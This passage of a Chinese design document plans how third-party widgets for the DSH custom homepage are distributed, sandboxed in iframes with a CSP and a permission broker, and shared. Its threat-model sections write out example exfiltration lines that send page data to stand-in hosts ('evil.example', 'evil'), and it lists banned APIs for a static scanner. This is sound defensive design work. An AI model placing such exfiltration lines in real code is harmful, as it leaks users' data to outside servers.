# 组件从哪里来 · DSH 自定义主页的组件发行、开发与分享设计

> 状态：设计讨论稿 v0 · 2026-11-08
> 基础：`docs/prototype/`（24 栏自由网格主页原型，27 个 demo 组件）
> 配套：`docs/research-comparable.md`（同类产品发行模型）、`docs/research-sandbox-tech.md`（沙箱机制）、
> `docs/prototype/sandbox-demo/`（可运行的最小安全加载 PoC）

---

## 0. 结论先行

**要做的不是「插件市场」，而是「三层可分享物 + 一条信任边界」。**

| 层 | 分享物 | 含代码 | 含数据 | 隔离 | 谁来写 | 安装代价 |
|---|---|---|---|---|---|---|
| **L0** | 布局预设 `.dshhome.json` | 否 | 否（默认脱敏） | 不需要 | 任何用户，拖几下就能导出 | 即时 |
| **L1** | 单文件组件 `.dshw.js` | 是 | 否 | **iframe + 能力经纪人** | 会用 AI 的用户 / 前端 | 即时、不重启 |
| **L2** | 静态注册表 `registry.json` | 只索引 L1 | 否 | 继承 L1 | 社区 / 官方 | 即时 |
| **L3** | 完整 DSH 插件（npm / 本地目录） | 是 | 可能 | 全信任（现有模型） | 开发者 | 重启 DSH |

一条红线：**组件代码永远拿不到凭据，也拿不到未声明的数据。** 数据只从宿主侧经纪人（broker）按
「权限 + 字段白名单」单向流入沙箱，沙箱默认断网。

```
┌──────────────────── DSH 页面（全信任，插件代码）────────────────────┐
│  主页壳：24 栏网格 / 拖拽 / 缩放 / 布局持久化 / 主题                  │
│                                                                     │
│   ├─ 内置组件（插件自带，页面内 React，受信）                         │
│   │                                                                 │
│   └─ 第三方组件宿主（L1 运行时）                                     │
│        └─ <iframe sandbox="allow-scripts">   ← 信任边界              │
│             ├─ widget.dshw.js（不可信代码，不能联网）                 │
│             └─ meta CSP: connect-src 'none'  ← 断网兜底              │
│                    ⇅ postMessage（init / request / data / notify）   │
│        数据经纪人：权限检查 → 字段白名单 → 审计 → 限流                │
│                    ⇅                                                 │
│        数据源层：凭据、各家 API、本机会话/浏览器历史（**只在这一层**） │
└─────────────────────────────────────────────────────────────────────┘
```

最轻的方案确实存在，而且就是用户猜的那样：**一个标准封装的 JS 文件**。作者侧最小只要 10 行
（见 §3.1）；宿主侧一次性实现一个沙箱运行时——核心逻辑约 300–400 行，PoC 的 `host.js` 988 行
是含演示 UI 的完整版。不需要 npm、不需要打包、不需要构建工具——但**需要一个安全边界，而这个
边界不是 JS 约定，是 iframe + CSP + 经纪人**。

推荐的默认路径：**普通用户玩 L0，想加组件用 L1，需要新数据源才升级 L3。**

---

## 1. 先把问题拆开：现在哪里是焊死的

### 1.1 现状

| 位置 | 能力 | 信任模型 |
|---|---|---|
| `lib/index.js`（宿主） | 读 `~/.dsh/.credentials.yaml`、请求各家 API、归一化用量、读写 `config.json`、提供 `/dsh-my-newhome/*` 路由 | Node 全信任 |
| `lib/client.js`（客户端） | 在 DSH 页面里跑 React，注入主题/背景/Logo，渲染工作区、常用入口、用量卡片 | **页面上下文全信任** |
| `docs/prototype/`（原型） | 组件 = `window.DSH_WIDGETS_*` 数组，`render(ctx)` 返回 HTML、`mount(root, ctx)` 绑交互 | **页面上下文全信任** |
| 布局 | `localStorage` / `config.json` 里的 `widgets.items`，可导出 JSON | 数据，无代码 |

也就是说，今天加一个组件只有一条路：**改插件的两个 JS 文件，重新装插件，重启 DSH**。而且一旦
允许「用户自己的 JS 进页面」，就是原型现在的样子——**组件和宿主共享整个页面**。

### 1.2 被焊死的三样东西

```
布局（数据）  ─┐
组件（代码）  ─┼─ 现在全在「插件」这一个包里，一起安装、一起信任、一起重启
数据源（权限）─┘
```

发行问题的本质是三者的**解耦 + 分级**：

- **布局**是纯数据，天然可分享，且默认不含隐私（只要导出时脱敏）；
- **组件**是可执行代码，可分享但**必须隔离**；
- **数据源**才是敏感的那一层（凭据、账号、本机路径），它**不该跟着组件走**。

> 现实中的反例：很多小组件产品把「数据源」也塞进组件，于是每个组件都要用户填一次 API key。
> 那是把凭据分散到 N 个不可信代码里，是数据泄露的最短路径。我们的选择相反：**数据源上收**。

### 1.3 可以被利用的攻击面（为什么不能「直接把 JS 塞进页面」）

原型式的 `<script>` 加载在 DSH 页面里意味着恶意组件可以：

1. `fetch('/dsh-my-newhome/usage')` —— 同源，直接读你所有供应商的余额/配额；
2. 读 `document` —— 输入框里正在打的字、侧栏里的会话标题、工作区名；
3. `new Image().src = 'https://evil.example/?' + btoa(data)` —— 当前页面没有 CSP 拦这个，数据就出去了；
4. 碰 `window.__ModuleLoader__` / 插件上下文 —— 那是整个 DSH 前端的后门；
5. 装死循环 / 抢焦点 / 画到组件格子外面 —— UI 层没有边界。

所以「轻巧」不能以「同页面执行」为代价。下面所有推荐都建立在这条之上。

---

## 2. 发行层级：L0–L3

### 2.1 L0 · 布局预设 `.dshhome.json`（零代码，先做这个）

原型已经能「⌘S 导出布局 JSON」，把它产品化即可：

```jsonc
{
  "schema": "dsh.home.layout/1",
  "name": "我的极简首页",
  "theme": { "mode": "dark", "accent": "#4f7cff" },   // 沿用原型的 theme 快照
  "preset": "custom",
  "rows": 18,
  "widgets": [
    { "type": "core:clock", "x": 1, "y": 1, "w": 5, "h": 3, "variant": 0 },
    { "type": "core:usage-deepseek", "x": 7, "y": 1, "w": 7, "h": 2 }
  ],
  "requires": [
    { "widget": "github:semon/weather", "version": "^1.0.0", "sha256": "…" }
  ]
}
```

- 字段尽量沿用原型 `app.js` 已有的快照格式（`theme` / `preset` / `rows` / `widgets[{type,x,y,w,h,variant}]`），
  只新增 `schema` / `name` / `requires`，减少导入导出两套格式的维护成本。
- **不含运行时数据**：工作区名、站点标题、余额、路径一律不导出，只留组件 id / 版本 / 位置 / 主题 token。
- 导入时缺组件 → 留空位 + 一键提示安装，不阻塞。
- 这是**普通人最容易参与的分享**：调好 6 个卡片的位置，导出，发出去，对方三秒还原。
- 反过来，布局也会成为 L1 组件的**分发顺风车**：分享一个「工作台布局」，会顺带告诉你需要哪些组件。

### 2.2 L1 · 单文件组件 `.dshw.js`（默认作者目标）

- **一个文件**：manifest + `render` + `mount`，无 import/export、无构建、无依赖。
- **运行在 iframe 沙箱**：`sandbox="allow-scripts"`（不加 `allow-same-origin`），opaque origin，
  拿不到父页面 DOM / cookie / localStorage / IndexedDB。
- **默认断网**：CSP `connect-src 'none'`，`img-src data: blob:`，`form-action 'none'`…… 数据只能
  通过宿主经纪人给的 postMessage 进入。
- **权限声明 + 安装时授权**：manifest 里写 `permissions: ['usage.read']`，安装/首次使用时用户确认。
- **可热装**：拖文件进去即可用，不重启 DSH。

这就是「最小一个标准封装的 JS」。规范见 §3，实测见 `docs/prototype/sandbox-demo/`。

### 2.3 L1b · URL 组件（可选的「在线小组件」）

有些组件天生要连在线服务（托管图表、第三方仪表盘）。比 L1 更轻——**连 JS 都不用写**，填一个 URL：

```jsonc
{ "widget": "url:https://example.com/embed/chart", "title": "构建时长", "network": "example.com" }
```

优点：作者零门槛、语言无关。代价（必须明说）：

- **数据会流向第三方站点**——只能用 postMessage 传用户明确同意的字段；
- 依赖对方在线，离线主页会开天窗；
- 对方可埋追踪；CSP / `X-Frame-Options` 可能直接拒绝被嵌；
- 与「本地优先」的产品气质冲突。

结论：**作为补充模式保留**，安装时明示「此组件会连接 example.com」，并在卡片上用一个小角标标出
网络来源；**不作为默认**。纯本地能做的，引导作者写 L1。

### 2.4 L2 · 静态注册表 `registry.json`（发现与分发，不做服务器）

不需要后端。一个静态 JSON 放在 GitHub Pages / 任意 CDN：

```jsonc
{
  "schema": "dsh.home.registry/1",
  "updated": "2026-11-08",
  "widgets": [
    {
      "id": "github:semon/weather",
      "name": "天气",
      "version": "1.2.0",
      "author": "semon",
      "description": "上海天气与三日预报",
      "file": "https://raw.githubusercontent.com/…/weather.dshw.js",
      "sha256": "…",
      "permissions": [],
      "grid": { "w": 5, "h": 3, "minW": 4, "minH": 3 },
      "screenshots": ["…"],
      "homepage": "…",
      "signed": { "key": "dsh-home-official", "sig": "…" }
    }
  ]
}
```

- 官方列表 = 精选 + 审核；用户可添加自己的注册表 URL（标「未验证」）。
- **哈希固定**：客户端按 `sha256` 校验下载到的文件；注册表条目被篡改但文件没换 → 直接拒装；
  文件换了哈希没变 → 不可能（哈希在条目里），所以**更新必须改 version + sha256**。
- 可选签名：官方用 Ed25519 对 `{id, version, sha256}` 签名，公钥随插件内置。签名只解决
  「这条目录没被篡改」，不解决「作者是好人」，两者都要说清楚。
- 撤回：`revocations.json`（id + version/hash），客户端拉到就禁用并提示。

### 2.5 L3 · 完整 DSH 插件（只在需要新数据源时）

现有模型不变：npm 包 / 本地目录 → 插件管理器 → 重启。它解决的是 L1/L2 解决不了的事：

- 需要**新的数据源**（新供应商配额、本机系统信息、浏览器历史解析）；
- 需要**系统能力**（文件、进程、通知、后台任务）；
- 需要和 DSH 其它部分（会话、设置、槽位）深度集成。

判断树：

```
只是想展示已有数据？ ────────────────────────→ L1 单文件组件
想换外观 / 配色 / 布局？ ─────────────────────→ L0 布局预设
需要一个新的凭据 / 新供应商？ ────────────────→ 先给核心插件提 provider（L3 connector）
需要文件系统 / 进程 / 通知 / 后台同步？ ──────→ L3 插件
只想嵌一个已经在线跑着的服务？ ───────────────→ L1b URL 组件
```

> 注意「先提 provider」这一条：**新数据源应该长在核心插件里，而不是长在每个组件里**。这样凭据只
> 存在一处、只被一份可信代码读取，组件继续只做展示。生态因此可以扩张，而信任边界不扩张。

---

## 3. 最小标准 JS 封装 v0

### 3.1 作者侧：10 行就够

```js
// hello.dshw.js —— 这就是一个完整组件
DSH_WIDGET.define({
  id: 'github:semon/hello',
  name: '你好',
  version: '1.0.0',
  permissions: [],
  grid: { w: 4, h: 2, minW: 3, minH: 2 },
  render: (ctx) => `<div class="w">${new Date().getHours()} 点</div>`,
})
```

带交互和权限的完整版：

```js
DSH_WIDGET.define({
  id: 'github:semon/usage-lite',
  name: '用量 · 简版',
  version: '1.0.0',
  author: 'semon',
  description: '各供应商的余额与 5 小时窗口用量',
  permissions: ['usage.read'],
  grid: { w: 7, h: 2, minW: 5, minH: 2, maxW: 14, maxH: 3 },
  config: [
    { key: 'provider', label: '供应商', type: 'select', default: 'deepseek', options: ['deepseek', 'minimax'] },
  ],

  render(ctx) {
    const items = ctx.data['usage.read'] || []          // 按资源名取，只有授权后才非空
    const item = items.find((u) => u.provider === ctx.config.provider)
    const big = item?.kind === 'balance' ? `¥${item.amount}` : `${item?.percent5h ?? '—'}%`
    return `<div class="w"><b class="big">${big}</b><span class="sub">5 小时</span></div>`
  },

  mount(root, ctx) {
    const off = ctx.on('data', (e) => { /* e = { resource, data }，数据刷新后重画 */ })
    const timer = setInterval(() => { /* 本地时钟 */ }, 1000)
    return () => { off(); clearInterval(timer) }   // cleanup 必须返回
  },
})
```

**作者心智模型和现在的 `docs/prototype/CONTRACT.md` 完全一致**：`render` 返回 HTML 字符串、
`mount` 绑定事件并返回 cleanup、样式用主题 token、`width/height:100%` 铺满、可交互元素加
`data-nodrag`。差异只有两点：顶层从「数组」变成 `define()`；数据从写死变成 `ctx.data`。

### 3.2 manifest 字段

| 字段 | 必填 | 说明 |
|---|---|---|
| `id` | ✓ | `core:` 保留给内置；第三方用 `github:user/name` 等带命名空间的形式，防撞名 |
| `name` / `version` / `author` / `description` | ✓（author/desc 可空） | 安装面板显示，`version` 参与更新与哈希 |
| `permissions` | ✓ | 空数组 = 零数据。见 §4.2 |
| `grid` | ✓ | `{ w, h, minW, minH, maxW, maxH }`，单位是格，和原型一致 |
| `config` |  | 简单表单 schema（text/select/switch/number），宿主渲染设置项，值存在宿主侧 |
| `icon` |  | 内联 SVG 字符串或 data URI（保持单文件；不加载外部资源） |
| `homepage` / `license` |  | 可选元信息 |

### 3.3 渲染契约（沿用原型）

`ctx`（v0）：

```ts
{
  theme: 'dark' | 'light',
  locale: 'zh-CN' | 'en',
  size: { w: number, h: number, cols: number, rows: number },   // 像素 + 格
  instanceId: string,            // 同一组件的多个实例区分
  config: Record<string, any>,   // 宿主从设置面板收的值
  data: Record<string, any>,     // 仅已授权资源，按资源名取：ctx.data['usage.read']
  now: Date,
  on(event, cb): () => void,     // 'data' | 'theme' | 'resize'
}
```

组件侧的全局 API（沙箱 bootstrap 暴露，宿主对象一概不暴露）：

| API | 说明 |
|---|---|
| `DSH_WIDGET.request(resource, params?)` | 返回 Promise；宿主按 `permissions` 校验，拒绝时 `code` ∈ `E_PERM_DENIED` / `E_PERM_NOT_DECLARED` / `E_UNKNOWN_RESOURCE` / `E_TIMEOUT` |
| `DSH_WIDGET.notify(level, text)` | 单向通知宿主（`info`/`warn`/`error`），宿主按纯文本渲染，不解析 HTML |
| `DSH_WIDGET.open(url)` | 请求宿主打开外链，二次确认后只放行 `http(s)` |
| （演示扩展）`DSH_WIDGET.reportProbe(items)` | 仅 PoC 用于把越权探针结果回传宿主展示，不属于正式规范 |

> **初始化顺序**（PoC 实测踩到的坑）：`init` 先发、`data` 可以为空，用户在授权确认条上点「允许」
> 后再推 `data` 事件。反过来「先授权再 init」会让组件首屏空白几秒。协议顺序仍然是 `ready → init`，
> `request` 流程不变。

硬性规则（从原型继承，沙箱里更容易守）：

- 根节点 `width:100%;height:100%`，不出现横向滚动条；
- 不用 `position:fixed`、`100vw/100vh`、全局 id、`document.querySelector` 找自己；
- 可交互元素 `data-nodrag`（沙箱里其实拖不动宿主，但为了和内置组件一致的交互契约保留）；
- `mount` 必须返回 cleanup，否则沙箱销毁/重渲染时定时器泄漏；
- 颜色只用主题变量，深/浅两套都要能看。

### 3.4 宿主桥协议（iframe ⇄ 宿主）

```
宿主 → 组件                      组件 → 宿主
{ t:'init', token, widgetId,    { t:'ready' }
  theme, locale, size,          { t:'request', id, resource, params }
  config, data, now }           { t:'notify', level, text }
{ t:'data', id, ok, data,       { t:'open', url }        // 宿主二次确认后打开
  error? }                      { t:'resize', size? }    // 可选：内容自报高度（预留）
{ t:'theme', theme }            { t:'probe', items }     // 仅 PoC 取证，非正式规范
{ t:'resize', size }
{ t:'teardown' }
```

- 宿主校验 `event.source === iframe.contentWindow`；应答带请求 `id`，防止乱序串话；
- `init` 携带随机 token，组件在 `ready` 里回显，宿主才发数据（避免其它 frame 抢注）；
  需要更强隔离可用 `MessageChannel` 在握手后传 `MessagePort`，后续消息不再依赖 `origin`；
- **初始化顺序**：`init` 先发（`data` 可空），授权确认后再推 `data` 事件；反过来会首屏空白
  （PoC 实测）；
- 组件不能**主动拉**任意数据：`request` 的资源必须在 manifest 的 `permissions` 里，否则经纪人
  直接拒绝并计数；拒绝次数会显示在设置页的「安全」面板里。

> 注意这里没有 `eval`、没有 `Function()`：组件源码在 `srcdoc` 里作为**内联脚本文本**注入，
> 浏览器只当普通脚本解析；宿主从不把字符串当代码执行。PoC 里就是这么做的。

### 3.5 为什么是「单文件 JS」，而不是别的

| 方案 | 作者成本 | 安全边界 | 离线 | 评价 |
|---|---|---|---|---|
| 单文件 JS + iframe 沙箱 | 极低（10 行） | **强**（opaque origin + CSP） | ✓ | **选它** |
| 同页面 `<script>`（原型现状） | 极低 | **无** | ✓ | 只可用于内置组件 |
| Web Component / Shadow DOM | 低 | **无**（Shadow DOM 不是安全边界） | ✓ | 不能解决信任问题，否 |
| npm 包 + 构建 | 高 | 无（仍是页面代码） | ✓ | 对「分享一个卡片」太重 |
| 完整 DSH 插件 | 最高 | 无（Node 全信任） | ✓ | 留给数据源/系统能力 |
| URL iframe（L1b） | 零代码 | 中（能嵌，但数据会流向对方） | ✗ | 补充模式 |
| 模板 DSL（JSON 渲染） | 低 | 强 | ✓ | 可以做 L0.5，但表达力太弱，先不做 |

选择标准的不是「技术上多先进」，而是**在保持作者极简的同时，把不可信代码关进一个浏览器原生就
保证的笼子里**。iframe + CSP 正好满足：零依赖、跨平台、行为可测（PoC 里有实测证据）。

### 3.6 现有 27 个组件的迁移成本

原型契约（`render(ctx)` / `mount(root, ctx)` / 主题 token / `data-nodrag`）是刻意设计成可迁移的：

- 组件定义从 `window.DSH_WIDGETS_*.push({...})` 改成 `DSH_WIDGET.define({...})`；
- 演示数据换成 `ctx.data` 或继续写死（demo 组件不申请权限就能跑）；
- CSS 从全局文件改成组件内联 `<style>`（沙箱里没有宿主的 `base.css`，需要把 token 和 `.w` 系列
  公共类**随组件打包**——这是唯一需要新增的「标准封装」内容，建议提供一个 1KB 的 `widget.base.css`
  字符串，由宿主注入到 iframe 文档头）。

结论：**约 90% 的组件可以原样搬进沙箱**，剩下 10% 是需要宿主私货的（输入框组件、需要拖拽宽度的）。

### 3.7 宿主侧最小实现（约 40 行伪代码）

```js
// 宿主侧（可信）。核心逻辑约 300–400 行，PoC 里 host.js 988 行是含演示 UI 的版本。
async function mountWidget(host, { id, code, declared, instanceId }) {
  // 1) 完整性：注入前在可信侧校验，失败绝不注入
  if ((await sha256(code)) !== ledger.get(id)) return reject('integrity')

  // 2) 固定模板：CSP meta 必须在 <head> 最前；sandbox 永不加 allow-same-origin
  const policy =
    "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
    "img-src data:; font-src data:; media-src 'none'; connect-src 'none'; " +
    "form-action 'none'; base-uri 'none'; frame-src 'none'; worker-src 'none'; object-src 'none'"
  const token = crypto.randomUUID()
  const iframe = document.createElement('iframe')
  iframe.setAttribute('sandbox', 'allow-scripts')          // 永不加 allow-same-origin
  iframe.setAttribute('referrerpolicy', 'no-referrer')
  iframe.setAttribute('allow', '')                          // 不授予任何 permissions policy
  iframe.srcdoc = `<!doctype html><html><head>
<meta http-equiv="Content-Security-Policy" content="${attr(policy)}">
<style>html,body{margin:0;height:100%;background:transparent}</style>
</head><body><div id="root"></div>
<script>${bootstrap(instanceId, token)}</script>
<script>${code.replace(/<\/script/gi, '<\\/script')}</script></body></html>`

  // 3) 桥：只认 contentWindow + token；request 走权限白名单
  addEventListener('message', (e) => {
    if (e.source !== iframe.contentWindow) return   // opaque origin 下唯一可靠的身份校验
    if (e.origin !== 'null') return                 // 沙箱帧必须是 opaque
    const m = e.data
    if (!m || m.token !== token || m.t !== 'request') return
    e.source.postMessage({ t: 'data', id: m.id, ...broker(m.resource, declared) }, '*')
  })

  // 4) 生命周期：3s 未 ready / 15s 无心跳 → remove + 重建（≤2 次）
  // 5) 可见性：IntersectionObserver 通知组件，不可见不 mount（省内存、避节流）
  host.append(iframe)
}
```

`bootstrap` 只暴露契约 API（`DSH_WIDGET.define` / `request` / `on` / `notify` / `open`），
**不暴露任何宿主对象**；`broker` 只返回已授权资源的脱敏字段。完整可运行版本见
`docs/prototype/sandbox-demo/`。

---

## 4. 数据不泄露：能力模型

### 4.1 四条原则

1. **数据源上收**：凭据只存在于宿主 `lib/index.js`，沙箱里永远没有 key、没有路径、没有账号。
2. **最小字段**：每个 permission 对应一个**带版本的数据契约**，只给展示必需的字段（见 §4.2）。
3. **默认断网**：组件不能自己发请求；要联网必须走 L1b URL 组件或宿主代理，且用户可见。
4. **假定会泄露**：沙箱能挡住「偷偷调用网络 API」，但**挡不住组件自己导航到外部 URL 把数据带在
   query 里**（见 §4.4）。所以任何喂进沙箱的数据，都按「该组件可能把它发出去」来裁剪——
   权限给得越小，这句假设越容易成立。

### 4.2 权限清单（v0）

| permission | 宿主数据源 | 实际给到组件的字段 | 默认 |
|---|---|---|---|
| （空） | 无 | 无 | 零权限组件占多数 |
| `time.now` | 浏览器时钟 | `now`, `tz` | 自动允许（透明起见仍声明） |
| `usage.read` | `/dsh-my-newhome/usage` 归一化结果 | `provider`, `kind`, `amount?`, `currency?`, `percent5h?`, `percentWeek?`, `percentMonth?`, `resetAt?`, `tone?` | 需授权 |
| `workspaces.read` | 本机会话 store | `name`, `sessions`, `lastUsedAt`, `blank`（**无路径、无会话内容**） | 需授权 |
| `links.read` | 本机浏览器历史 / 自定义入口 | `title`, `domain`（**无完整 URL、无 query**） | 需授权 |
| `storage.self` | 宿主 KV（按组件 id 命名空间） | 读写自己的键，配额 64KB | 需授权 |
| `clipboard.write` | 宿主 | 写文本 | 需授权 |
| `open.url` | 宿主 | 用户确认后交给系统浏览器打开 | 每次确认 |
| `network.<host>` | 宿主代理（剥 cookie/凭据、限速、记日志） | 仅该 host 的响应 | **v1 不提供**，见 §9 |

数据契约是**字段级白名单**，不是「给个对象自己挑」。新增字段算破坏性变更，要提 spec 版本。

```jsonc
// usage.read 的实际载荷（组件能看到的全部内容）
[
  { "provider": "deepseek", "kind": "balance", "amount": 12.34, "currency": "CNY" },
  { "provider": "minimax", "kind": "quota", "percent5h": 23, "percentWeek": 9,
    "percentMonth": 41, "resetAt": 1762524000000, "tone": "normal" }
]
```

> 对照现有 `lib/index.js` 的 `PROVIDER_DEFS`/`usagePayload`：归一化其实已经做完了，经纪人只是
> 把同一份 payload 再按权限裁一刀。**基础设施已经在了，缺的是「谁有权拿到它」这一层。**

### 4.3 宿主侧经纪人（broker）要做什么

```
组件 --request(usage.read)--> 经纪人
                                ├─ 权限检查（manifest + 用户授权 + 企业策略）
                                ├─ 资源映射（usage.read → 已有归一化 payload）
                                ├─ 字段裁剪（白名单，不认识的字段直接丢）
                                ├─ 审计（哪个组件、何时、拿了什么，本地 ring buffer）
                                └─ 限流（每组件每秒 N 次，超限拒绝并计数）
```

- **审计日志只在本机**，默认不落盘、不上报；「安全」面板可看最近 100 条。
- 用户可在设置页对单个组件**撤销授权 / 禁用 / 卸载**；撤销后组件下次 `request` 直接失败。
- 企业/团队策略（可选）：只允许签名注册表、禁 URL 组件、禁 `network.*`。

### 4.4 运行时的硬边界

> 详细机制与浏览器证据见 `docs/research-sandbox-tech.md`，这里给结论。

| 边界 | 做法 | 作用 / 实测结论 |
|---|---|---|
| DOM / 存储隔离 | `<iframe sandbox="allow-scripts" referrerpolicy="no-referrer">`，**永不加 `allow-same-origin`** | opaque origin（`self.origin === "null"`）：读不到父文档、无 cookie/localStorage/IndexedDB/caches；`window.open` 返回 `null`，表单/下载/全屏/pointer lock 全部被挡 |
| 网络外泄 | srcdoc `<head>` **第一行**注入 meta CSP：`default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; media-src 'none'; connect-src 'none'; form-action 'none'; base-uri 'none'; frame-src 'none'; worker-src 'none'; object-src 'none'` | 实测 fetch/XHR/`new Image()`/外链 script/blob Worker 全部被拦。**不给 `'unsafe-eval'`**：组件不许用 `eval`/`new Function`，`check` 会静态查。注意 meta 必须早于任何脚本，策略从解析到它那刻才生效 |
| 抢焦点/导航 | sandbox 不放 `allow-top-navigation`、`allow-popups`、`allow-forms`、`allow-modals`、`allow-pointer-lock`、`allow-fullscreen`，并给 `allow=""` | 只能在自己的格子里画 |
| **自导航外泄（挡不住）** | 无解——CSP `navigate-to` 在 Chrome 156 **未实现**（写了 header 照跳），沙箱帧可以 `location.href = 'https://evil/?d=…'`。缓解：数据最小化 + 宿主监听 iframe `load`，一旦发现被导航走就销毁重建 + 计一次风险事件 | 这是本方案安全上限的来源，必须写进文档而不是藏起来 |
| 卡死 / DoS | 握手超时（3s 无 `ready`）+ 心跳超时（15s 无心跳）→ `iframe.remove()` 后重建（≤2 次），计故障 | 实测 Chromium 把 opaque 沙箱帧放**独立渲染进程（OOPIF）**：子帧 `while(true){}` 时父页照常响应、能删帧重建。**但这是实现细节不是标准**，且内存没有 per-iframe 配额 |
| 可见性 / 节流 | 宿主用 `IntersectionObserver` 通知可见性；不可见帧的 `setInterval` 实测被压到约 1 次/秒、rAF 基本停摆 | 时钟类组件要写成「渲染时读当前时间」而不是靠 tick 累积；不可见不挂载 |
| 尺寸/溢出 | iframe 固定为格子像素，宿主侧 `overflow:hidden` | 组件画不出边界 |
| 供应链 | 宿主侧维护 `id+version → sha256` 台账，**注入前在可信侧复核**；可选 Ed25519（Chrome 137+）；更新改权限必须重新授权 | SRI 只对带 CORS 的外链 script 有效，对内联注入无效——所以哈希必须在宿主算、注入前校验 |

**三个必须说清楚的边界**：

1. 沙箱不防「组件本身显示错误信息」——组件能看到的、用户授权过的数据，它当然可以画错。
2. **自导航外泄挡不住**：所以「喂进去的数据必须按泄了也不心疼处理」，这条决定了权限表的上限。
3. **进程隔离是 Chromium 实现细节**：Electron 若关闭 site isolation 可能退化；不能把「死循环不
   影响宿主」当成跨平台保证。

**已核实的宿主 CSP 环境**（2026-11-08，DSH 桌面端 0.2.2-rc.1，Electron 44.7.0 / Chromium 152）：

| 检查点 | 结果 |
|---|---|
| Electron 主进程 `lib/main.js` 是否用 `onHeadersReceived` 注入 CSP | **没有**（只有 `webRequest.onBeforeSendHeaders` 做其它事） |
| `dsh-app` 自定义协议 `serveWebDocument()` 是否加安全响应头 | **没有**，只设 `content-type`；协议注册为 `standard + secure`，未注册 `bypassCSP` |
| Web 前端入口 `dsh-web-frontend/dist/index.html` 是否有 CSP meta | **没有**（只有 charset/viewport/manifest/icon/module script） |
| 本地 web server `dsh-host-webserver` 是否加 CSP | **没有** |
| 主进程 `webPreferences` | `sandbox: true`、`contextIsolation: true`、`nodeIntegration: false`；注意这是**渲染进程的操作系统级沙箱**，与 iframe 的 `sandbox` 属性是两件事 |
| Web GUI（`http://127.0.0.1:…`）响应头 | 需要 token，未验证；同一份 dist 由 Host 提供，预计同样无 CSP |

结论：**当前 DSH 页面没有 Content-Security-Policy**，`srcdoc` 的内联脚本可用。还要记住一条实测规则：
**srcdoc 会继承父文档 CSP（header 与 meta 都继承），子文档的 meta 只能加严不能放宽**。今天父文档
没有 CSP，所以只有我们自己写的 meta 生效；未来 DSH 若收紧 CSP，本方案要按这条规则复核——
这正是「iframe 文档来源必须可替换（srcdoc → 宿主路由 + 响应头 CSP）」的原因。

### 4.5 分享时到底有什么会跟着走

这是「不泄露数据」里最容易被忽略的一半：**经常是分享动作本身在泄露**。

| 物料 | 是否随组件走 | 处理 |
|---|---|---|
| 组件代码 | ✓ | 唯一被分享的东西 |
| manifest（id/版本/权限） | ✓ | 安装面板展示 |
| 组件配置值（config） | ✗ | 存在宿主 `config.json`；导出时只带 schema 默认值 |
| 运行时数据（工作区名、站点、余额、路径） | ✗ | 从不进入导出物 |
| 布局（位置/尺寸/主题） | 仅 L0/L2 主页包时 | 默认只含 id/version/hash，不含名字 |
| 背景图 / 自定义 Logo | 仅用户显式勾选 | 默认不含（截图可能带隐私） |
| 审计日志 | ✗ | 只在本机 |

再补一条 UI 规则：**「导出主页」对话框要逐项列出将被写进文件的字段**，而不是一个黑盒按钮。
用户分享前看到「将包含：6 个组件位置、主题色；不包含：工作区名称、余额、背景图」，才会放心。

### 4.6 安装时的知情同意（照抄应用商店做得好的部分）

安装面板必须一屏讲清：

```
天气 · github:semon/weather · v1.2.0
作者 semon · 12 KB · sha256 4f9a…c21e
权限：无（不读取任何本机数据，不联网）
[安装]  [查看源码]
```

升级时如果 `permissions` 变了：

```
新版本申请新权限：usage.read（读取余额与配额百分比）
[拒绝并保留旧版]  [允许并更新]
```

---

### 4.7 供应链：更新比安装更危险

同类产品的事故（The Great Suspender、GlassWorm、PhantomPulse）几乎都不是「装的时候就是恶意
软件」，而是「装的时候是好的，后来变坏了」。所以更新通道要按不可信处理：

- **安装时固定 sha256**，更新必须显式确认，不静默更新；
- **权限增加 = 重新授权**（同 Chrome 的 optional permissions 语义）；
- **作者身份变化告警**：包所有权转移、签名 key 变更时停止自动更新，标红提示；
- **保留上一版本**，可回滚；注册表可用 `revocations.json` 按 id+hash 撤回；
- 「检查更新」入口展示权限 diff，而不是一个「全部更新」按钮。

> 这条和 §4.6 的安装同意书是一对：**安装靠知情，更新靠可控。** L1 组件默认不自动更新。

---

## 5. 用户如何开发自己的组件

### 5.1 三类作者，一条路

| 作者 | 入口 | 需要会什么 |
|---|---|---|
| 普通用户 | 「新建组件」→ 模板 + 自然语言描述 → 让 AI 写 → 本地校验 | 会提需求 |
| 半技术用户 | 复制官方模板，改文案/颜色/数据 | HTML/CSS 基础 |
| 前端开发者 | 读 `WIDGET-SPEC`，本地 harness，提交注册表 | 全部 |

**这类产品的现实是：绝大多数组件会由 AI 生成。** 所以「规范文档」本身就是产品的一部分——它要
短、要可粘贴、要能让模型一次写对。建议把 §3 直接抽成 `widget-spec.md` 作为提示词附件，再配
`examples/` 里 3–5 个 10–60 行的正例。

### 5.2 工具链（全部可以做成零依赖 Node 脚本）

```bash
dsh home widget init my-widget      # 生成 my-widget.dshw.js + README + 示例数据
dsh home widget dev my-widget.js    # 本地 harness：热重载 + 主题/尺寸矩阵 + 数据 fixture
dsh home widget check my-widget.js  # schema 校验 + 静态扫描 + 截图
dsh home widget pack my-widget.js   # 算 sha256、生成 registry 条目
```

- **dev harness** 就是 `docs/prototype/sandbox-demo/` 的可复用版：起一个静态页，把组件塞进沙箱，
  注入模拟数据，左边切尺寸/主题，右边显示 console、权限请求、CSP 拦截记录。
- **check** 的静态扫描（只是提示，真正的强制在沙箱）：
  - 禁用 API：`document`、`window.parent`、`top`、`fetch`、`XMLHttpRequest`、`WebSocket`、`eval`、
    `new Function`、`import(`、`localStorage`；
  - 必须项：`id` kebab/命名空间、`permissions` 在已知清单内、`grid` 合理、`mount` 有 return；
  - 尺寸矩阵：默认/最小/最大 × 深/浅 = 6 张截图，用无头 Chrome 跑（原型里已有这套手法）。
- **pack** 输出可直接贴进 `registry.json` 的条目 + sha256，作者不用自己算哈希。

### 5.3 组件作者不该关心的事

- 不处理拖拽/缩放/避让/网格吸附——宿主的事；
- 不处理深色主题切换——token 自动跟；
- 不碰凭据、不碰网络——除非声明并获批；
- 不写设置页——`config` schema 由宿主渲染。

这四条决定了「10 行组件」是可能的，也决定了**组件的攻击面天然小**。

---

## 6. 用户如何分享

### 6.1 单组件

| 方式 | 流程 | 适用 |
|---|---|---|
| 文件 | 把 `weather.dshw.js` 拖进「组件」设置页 / 邮件附件 | 熟人、内网 |
